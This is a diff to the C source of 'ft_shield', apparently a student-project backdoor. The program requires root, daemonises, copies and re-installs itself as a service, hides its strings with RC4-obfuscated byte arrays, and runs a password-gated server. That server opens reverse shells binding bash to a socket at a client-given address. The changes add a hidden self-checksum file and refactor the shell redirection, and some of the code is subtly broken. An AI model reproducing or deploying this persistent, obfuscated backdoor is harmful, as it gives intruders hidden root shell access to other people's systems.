@@ -20,10 +20,10 @@ const unsigned char	srccode[]	=	{0x11};
 
 #define LOGINS					"orekabe & aabdou\n"
 #define SUDO					"You should run 'ft_shield' with sudo privilege\n"
-#define	MOD						1000000007
 #define	MAX_CLIENT_CONNECTION	3
 
 const unsigned char	servport[]	=	{0x07, 0x4E, 0x22, 0x27};
+const unsigned char	ftscheck[]	=	{0x1D, 0x1A, 0x62, 0x4A, 0xDD, 0xA1, 0x85, 0x85, 0xF4, 0x5A, 0x37, 0x03, 0xD0, 0xDE, 0x75, 0xBE, 0x40, 0xE7, 0x48};
 const unsigned char sfc[]		=	{0x68, 0x29, 0x78, 0x7C, 0xDA, 0x94, 0xE6, 0xA4, 0xFD, 0x4D, 0x0B, 0x12, 0xD1, 0xCB, 0x62, 0xBC, 0x5C, 0xFC, 0x18,
 									 0x7A, 0x28, 0x0F, 0x48, 0xC5, 0x4C, 0xBA, 0x39, 0x75, 0x50, 0x8A, 0x76, 0x00, 0x5B, 0x8C, 0x52, 0x58, 0x5C, 0x94,
 									 0xA8, 0x1B, 0x4B, 0xDF, 0xAB, 0x48, 0xFE, 0x33, 0xF0, 0xFB, 0x08, 0x24, 0xCC, 0x2D, 0x66, 0xC7, 0xD1, 0x07, 0xC0,
@@ -149,14 +149,9 @@ const unsigned char cnfailed[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA6
 									 0x91, 0x1F, 0x57, 0x88, 0xC8};
 const unsigned char enterpass[]	=	{0x63, 0x10, 0x73, 0x74, 0xDD, 0xAC, 0xCC, 0x85, 0xF6, 0x4A, 0x0D, 0x12, 0x98, 0xC2, 0x79, 0xA0, 0x41, 0xB2, 0x55,
 									 0x7D, 0x2F, 0x23, 0x4C, 0xC2, 0x57, 0xBB, 0x6F, 0x31};
-const unsigned char objcmd[]	=	{0x5C, 0x1E, 0x7C, 0x71, 0xDB, 0xA4, 0x9C, 0xC0, 0xB5, 0x4D, 0x48, 0x4D, 0xD2, 0x9B, 0x38, 0xA1, 0x56, 0xEA, 0x51,
-									 0x3C, 0x3A, 0x24, 0x64, 0xDE, 0x4D, 0xB6, 0x30, 0x7D, 0x14};
-const unsigned char catcmd[]	=	{0x50, 0x1D, 0x62, 0x35, 0x81, 0xAC, 0x98, 0x83, 0xB7, 0x4D, 0x11, 0x13, 0xCC, 0xDE, 0x7B, 0xB1, 0x1C, 0xE1, 0x5C,
-									 0x6F, 0x28, 0x35, 0x56, 0x82, 0x43, 0xAB, 0x0A, 0x62, 0x18, 0x97, 0x61, 0x03, 0x55, 0xC3, 0x4F, 0x37, 0x24, 0xB9,
-									 0x92, 0x1D, 0x5C};
 const unsigned char runcmd[]	=	{0x54, 0x1F, 0x75, 0x35, 0x83, 0x9E, 0x8D, 0x8C, 0xF4, 0x1E, 0x45, 0x37, 0xDD, 0xC3, 0x62, 0xA7, 0x52, 0xB2, 0x08,
 									 0x4B, 0x39, 0x22, 0x49, 0xC2, 0x57, 0xFF, 0x70, 0x62, 0x50, 0xD3, 0x6B, 0x4F, 0x14, 0x9E};
-const unsigned char permis[]	=	{0x41};
+const unsigned char readmode[]	=	{0x41, 0x1E};
 const unsigned char writemode[]	=	{0x44, 0x1E};
 const unsigned char frline[]	=	{0x50, 0x13, 0x78, 0x66, 0xDA, 0xE9, 0x99, 0x8E, 0xEB, 0x57, 0x0F, 0x0E, 0xDD, 0xDF, 0x36, 0xB6, 0x5B, 0xF3, 0x57,
 									 0x15, 0x2F, 0x22, 0x58, 0xCE, 0x4A, 0xBB, 0x30, 0x4A, 0x2D, 0xF7, 0x39, 0x66, 0x4A, 0xE7};
@@ -165,6 +160,7 @@ const unsigned char vnewline[]	=	{0x1F, 0x76};
 const unsigned char vspace[]	=	{0x1F, 0x5C};
 const unsigned char hexspec[]	=	{0x03, 0x04, 0x33, 0x25, 0x9C, 0x91};
 const unsigned char srcspec[]	=	{0x16, 0x0F};
+const unsigned char dspec[]		=	{0x25, 0x64};
 const unsigned char filespec[]	=	{0x1C, 0x08, 0x7B, 0x65, 0x81, 0xEC, 0x80, 0x84, 0xC7, 0x1B, 0x04, 0x0C, 0xDC, 0xE4, 0x33, 0xB9, 0x5F, 0xE7, 0x0B,
 									 0x7F};
 const unsigned char rsspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0x9F, 0xFC, 0x9F, 0xC0, 0xBD, 0x0B, 0x1B};
@@ -263,6 +259,12 @@ unsigned char	*RC4(const char *salt, const unsigned char *msg, size_t len)
 	for (size_t i = 0; i < len; i++)
 		cypher[i] = msg[i] ^ K[i];
 	return cypher;
+}
+
+void	dupdup(int fd)
+{
+	if (dup2(fd, STDIN_FILENO) < 0 || dup2(fd, STDOUT_FILENO) < 0 || dup2(fd, STDERR_FILENO) < 0)
+		exit(1);
 }
 
 char	*generate_random_filename()
@@ -365,7 +367,6 @@ bool	is_bin(void)
 
 void	create_daemon(void)
 {
-	int				fd;
 	pid_t			pid = fork();
 	unsigned char	*cypher;
 
@@ -383,39 +384,103 @@ void	create_daemon(void)
 	}
 	free(cypher);
 	umask(0);
-	cypher = RC4(LOGINS, nullpath, sizeof(nullpath));
-	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0755);
-	free(cypher);
-	if (fd < 0)
-		exit(1);
-	if (dup2(fd, STDIN_FILENO) < 0 || dup2(fd, STDOUT_FILENO) < 0 || dup2(fd, STDERR_FILENO) < 0)
-		exit(1);
-	if (close(fd) < 0)
-		exit(1);
 	return ;
+}
+
+unsigned char	*get_file_data(int idx)
+{
+	size_t			size, rsize;
+	char			selfpath[PATH_MAX];
+	unsigned char	*cypher;
+	unsigned char	*pcypher = RC4(LOGINS, readmode, sizeof(readmode));
+	unsigned char	*buff = NULL;
+	FILE			*file;
+
+	if (idx == 1)
+	{
+		cypher = RC4(LOGINS, progpath, sizeof(progpath));
+		size = readlink((const char *)cypher, selfpath, sizeof(selfpath)-1);
+		if (size < 0)
+		{
+			free(cypher);
+			free(pcypher);
+			exit(1);
+		}
+		selfpath[size] = 0;
+		file = popen(selfpath, (const char *)pcypher);
+	}
+	else
+	{
+		if (idx == 2)
+			cypher = RC4(LOGINS, sfcpath, sizeof(sfcpath));
+		else
+			cypher = RC4(LOGINS, ftscheck, sizeof(ftscheck));
+		file = popen((const char *)cypher, (const char *)pcypher);
+	}
+	free(cypher);
+	free(pcypher);
+	if (!file)
+		exit(1);
+	fseek(file, 0, SEEK_END);
+	size = ftell(file);
+	rewind(file);
+	buff = (unsigned char *)calloc(size + 1, sizeof(unsigned char));
+	if (!buff)
+	{
+		fclose(file);
+		exit(1);
+	}
+	rsize = fread(buff, 1, size, file);
+	if (rsize != size)
+	{
+		free(buff);
+		fclose(file);
+		exit(1);
+	}
+	if (fclose(file) < 0)
+	{
+		free(buff);
+		exit(1);
+	}
+	return buff;
 }
 
 bool	file_checksum(bool bin)
 {
-	char			c;
-	long			checksum = 0;
-	unsigned char	*cypher = (bin ? RC4(LOGINS, objcmd, sizeof(objcmd)) : RC4(LOGINS, catcmd, sizeof(catcmd)));
-	unsigned char	*pcypher = RC4(LOGINS, permis, sizeof(permis));
-	FILE			*bintxt = popen((const char *)cypher, (const char *)pcypher);
-
-	free(cypher);
-	free(pcypher);
-	if (bintxt)
+	unsigned long	checksum = 0, checksum1;
+	unsigned char	*cypher;
+	unsigned char	*buff = NULL;
+	FILE			*file;
+	if (bin)
+		buff = get_file_data(1);
+	else
+		buff = get_file_data(2);
+	checksum = DJB2(buff);
+	free(buff);
+	if (!bin && checksum == sfcchecksum)
+		return true;
+	if (!bin)
+		return false;
+	cypher = RC4(LOGINS, ftscheck, sizeof(ftscheck));
+	if (!access((const char *)cypher, F_OK))
 	{
-		while ((c = fgetc(bintxt)) != EOF)
-			checksum = ((checksum % MOD) + (c % MOD)) % MOD;
-		if (fclose(bintxt) < 0)
-			exit(1);
-		if (bin && checksum == binchecksum)
-			return true;
-		else if (!bin && checksum == sfcchecksum)
+		free(cypher);
+		buff = get_file_data(3);
+		checksum1 = atoll((const char *)buff);
+		free(buff);
+		if (checksum == checksum1)
 			return true;
 	}
+	free(cypher);
+	cypher = RC4(LOGINS, ftscheck, sizeof(ftscheck));
+	file = fopen((const char *)ftscheck, (const char *)writemode);
+	free(cypher);
+	if (!file)
+		exit(1);
+	cypher = RC4(LOGINS, dspec, sizeof(dspec));
+	fprintf(file, (const char *)dspec, checksum);
+	if (fclose(file) < 0)
+		exit(1);
 	return false;
 }
 
@@ -492,6 +557,7 @@ void	move_to_target(void)
 		if (file_checksum(true))
 			return;
 	}
+	free(cypher);
 	quine();
 	return;
 }
@@ -679,8 +745,7 @@ void	create_reverse_shell_session(int client_fd, char *user_input)
 		revsockaddr.sin_port = htons(port_to_int);
 		revsockaddr.sin_addr.s_addr = inet_addr(ip);
 		connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
-		if (dup2(sockt, STDIN_FILENO) < 0 || dup2(sockt, STDOUT_FILENO) < 0 || dup2(sockt, STDERR_FILENO) < 0)
-			exit(1);
+		dupdup(sockt);
 		cypher = RC4(LOGINS, bash, sizeof(bash));
 		argv[0] = strdup((char *)cypher);
 		free(cypher);
@@ -932,7 +997,7 @@ void	recv_msg_from_client(int idx)
 	buff[len-1] = 0;
 	if (!g_server->clients_info[idx].is_logged)
 	{
-		if (paschecksum == DJB2(buff))
+		if (paschecksum == DJB2((unsigned char *)buff))
 		{
 			g_server->clients_info[idx].is_logged = true;
 			g_server->clients_info[idx].password_try_count = 0;
@@ -1048,14 +1113,24 @@ void	spawn_server(void)
 
 int	main()
 {
+	unsigned char	*cypher;
 	struct timespec ts;
+	int				fd;
+
 	clock_gettime(CLOCK_REALTIME, &ts);
 	srand(ts.tv_nsec ^ ts.tv_sec);
-
 	if (getegid())
 		ft_error(SUDO);
 	printf("%s", LOGINS);
 	setup_signals();
+	cypher = RC4(LOGINS, nullpath, sizeof(nullpath));
+	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+	free(cypher);
+	if (fd < 0)
+		exit(1);
+	dupdup(fd);
+	if (close(fd) < 0)
+		exit(1);
 	if (is_bin())
 	{
 		config_service();
